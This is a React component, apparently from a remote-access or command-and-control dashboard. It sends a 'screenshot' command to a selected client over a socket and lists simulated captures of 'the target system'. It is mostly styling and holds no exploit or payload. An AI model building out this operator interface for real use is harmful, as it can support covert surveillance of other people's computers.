import React, { useState } from 'react';
import styled from 'styled-components';
import { 
  FiCamera, 
  FiDownload, 
  FiRefreshCw,
  FiEye,
  FiTrash2,
  FiMaximize2,
  FiClock,
  FiImage
} from 'react-icons/fi';
import { toast } from 'react-toastify';

const ScreenshotsContainer = styled.div`
  background: #0a0a0a;
  border-radius: 12px;
  border: 1px solid #333;
  height: calc(100vh - 140px);
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const Header = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const Title = styled.h1`
  font-size: 20px;
  font-weight: 600;
  color: #fff;
  display: flex;
  align-items: center;
  gap: 12px;
`;

const ActionButton = styled.button`
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border: none;
  color: #000;
  padding: 12px 20px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 600;
  transition: all 0.2s;

  &:hover {
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(0, 255, 136, 0.3);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
  }
`;

const Content = styled.div`
  flex: 1;
  padding: 20px;
  overflow-y: auto;
`;

const ScreenshotGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 20px;
`;

const ScreenshotCard = styled.div`
  background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
  border-radius: 12px;
  border: 1px solid #333;
  overflow: hidden;
  transition: all 0.2s;

  &:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
  }
`;

const ScreenshotImage = styled.div`
  width: 100%;
  height: 200px;
  background: #0a0a0a;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #666;
  font-size: 48px;
  border-bottom: 1px solid #333;
  cursor: pointer;
  transition: all 0.2s;

  &:hover {
    background: #1a1a1a;
    color: #00ff88;
  }
`;

const ScreenshotInfo = styled.div`
  padding: 16px;
`;

const ScreenshotName = styled.div`
  color: #fff;
  font-weight: 500;
  margin-bottom: 8px;
  font-size: 14px;
`;

const ScreenshotDetails = styled.div`
  color: #888;
  font-size: 12px;
  display: flex;
  align-items: center;
  gap: 16px;
  margin-bottom: 12px;
`;

const ScreenshotActions = styled.div`
  display: flex;
  gap: 8px;
`;

const ActionBtn = styled.button`
  background: rgba(0, 255, 136, 0.2);
  border: 1px solid #00ff88;
  color: #00ff88;
  padding: 6px 12px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.3);
  }

  &.danger {
    background: rgba(220, 53, 69, 0.2);
    border-color: #dc3545;
    color: #dc3545;

    &:hover {
      background: rgba(220, 53, 69, 0.3);
    }
  }
`;

const EmptyState = styled.div`
  text-align: center;
  padding: 60px 20px;
  color: #666;

  .icon {
    font-size: 64px;
    margin-bottom: 20px;
    opacity: 0.5;
  }

  h3 {
    font-size: 24px;
    margin-bottom: 12px;
    color: #888;
  }

  p {
    font-size: 16px;
    line-height: 1.5;
  }
`;

const Modal = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.9);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  padding: 20px;
`;

const ModalContent = styled.div`
  background: #1a1a1a;
  border-radius: 12px;
  padding: 20px;
  max-width: 90vw;
  max-height: 90vh;
  position: relative;
`;

const ModalImage = styled.img`
  max-width: 100%;
  max-height: 80vh;
  border-radius: 8px;
`;

const ModalClose = styled.button`
  position: absolute;
  top: 10px;
  right: 10px;
  background: rgba(0, 0, 0, 0.7);
  border: none;
  color: #fff;
  width: 40px;
  height: 40px;
  border-radius: 50%;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 0, 0, 0.9);
  }
`;

const Screenshots = ({ client, socket }) => {
  const [screenshots, setScreenshots] = useState([]);
  const [capturing, setCapturing] = useState(false);
  const [selectedImage, setSelectedImage] = useState(null);

  const handleCaptureScreenshot = () => {
    if (!client || !socket) return;

    setCapturing(true);
    socket.emit('executeCommand', {
      clientId: client.id,
      command: 'screenshot'
    });

    // Simulate capture process
    setTimeout(() => {
      setCapturing(false);
      const newScreenshot = {
        id: Date.now(),
        name: `screenshot_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.bmp`,
        timestamp: new Date(),
        size: '2.4 MB'
      };
      setScreenshots(prev => [newScreenshot, ...prev]);
      toast.success('Screenshot captured successfully!');
    }, 2000);
  };

  const handleDownload = (screenshot) => {
    // Download logic would go here
    toast.success(`Downloading ${screenshot.name}...`);
  };

  const handleDelete = (screenshotId) => {
    setScreenshots(prev => prev.filter(s => s.id !== screenshotId));
    toast.success('Screenshot deleted');
  };

  const handleView = (screenshot) => {
    setSelectedImage(screenshot);
  };

  const closeModal = () => {
    setSelectedImage(null);
  };

  if (!client) {
    return (
      <ScreenshotsContainer>
        <div style={{ 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center', 
          height: '100%',
          color: '#666',
          fontSize: '16px'
        }}>
          Select a client to capture screenshots
        </div>
      </ScreenshotsContainer>
    );
  }

  return (
    <ScreenshotsContainer>
      <Header>
        <Title>
          <FiCamera />
          Screenshot Capture
        </Title>
        <ActionButton 
          onClick={handleCaptureScreenshot}
          disabled={capturing}
        >
          <FiCamera />
          {capturing ? 'Capturing...' : 'Capture Screenshot'}
        </ActionButton>
      </Header>

      <Content>
        {screenshots.length === 0 ? (
          <EmptyState>
            <FiCamera className="icon" />
            <h3>No Screenshots Captured</h3>
            <p>Click "Capture Screenshot" to take a screenshot of the target system</p>
          </EmptyState>
        ) : (
          <ScreenshotGrid>
            {screenshots.map(screenshot => (
              <ScreenshotCard key={screenshot.id}>
                <ScreenshotImage onClick={() => handleView(screenshot)}>
                  <FiImage />
                </ScreenshotImage>
                <ScreenshotInfo>
                  <ScreenshotName>{screenshot.name}</ScreenshotName>
                  <ScreenshotDetails>
                    <span>
                      <FiClock style={{ marginRight: '4px' }} />
                      {screenshot.timestamp.toLocaleString()}
                    </span>
                    <span>{screenshot.size}</span>
                  </ScreenshotDetails>
                  <ScreenshotActions>
                    <ActionBtn onClick={() => handleView(screenshot)}>
                      <FiEye />
                      View
                    </ActionBtn>
                    <ActionBtn onClick={() => handleDownload(screenshot)}>
                      <FiDownload />
                      Download
                    </ActionBtn>
                    <ActionBtn 
                      onClick={() => handleDelete(screenshot.id)}
                      className="danger"
                    >
                      <FiTrash2 />
                      Delete
                    </ActionBtn>
                  </ScreenshotActions>
                </ScreenshotInfo>
              </ScreenshotCard>
            ))}
          </ScreenshotGrid>
        )}
      </Content>

      {selectedImage && (
        <Modal onClick={closeModal}>
          <ModalContent onClick={(e) => e.stopPropagation()}>
            <ModalClose onClick={closeModal}>×</ModalClose>
            <ModalImage 
              src={`data:image/bmp;base64,${selectedImage.data}`} 
              alt={selectedImage.name}
            />
          </ModalContent>
        </Modal>
      )}
    </ScreenshotsContainer>
  );
};

export default Screenshots;
